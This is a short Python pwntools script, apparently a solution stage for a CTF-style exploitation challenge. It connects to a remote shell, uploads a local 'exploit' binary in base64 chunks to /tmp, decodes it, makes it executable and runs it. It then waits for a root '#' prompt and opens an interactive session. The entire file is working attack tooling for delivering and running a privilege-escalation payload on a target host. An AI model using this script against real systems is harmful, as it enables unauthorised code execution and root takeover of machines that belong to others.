#!/usr/bin/python3
from pwn import remote, context, log, base64, sys

if len(sys.argv) != 2:
    log.failure(f"Usage: python3 {sys.argv[0]} <ip:port>")
    sys.exit(1)

context.newline = b"\r\n"

ip, port = sys.argv[1].split(":")
shell = remote(ip, port)

with open("./exploit", "rb") as file:
    payload = base64.b64encode(file.read()).decode()

for i in range(0, len(payload), 512):
    shell.sendlineafter(b"$ ", f'echo "{payload[i:i+512]}" >> /tmp/payload'.encode())

shell.sendlineafter(b"$ ", b"base64 -d /tmp/payload > /tmp/exploit")
shell.sendlineafter(b"$ ", b"rm /tmp/payload; chmod +x /tmp/exploit")
shell.sendlineafter(b"$ ", b"/tmp/exploit")

shell.recvline_contains(b"# ")
shell.interactive()
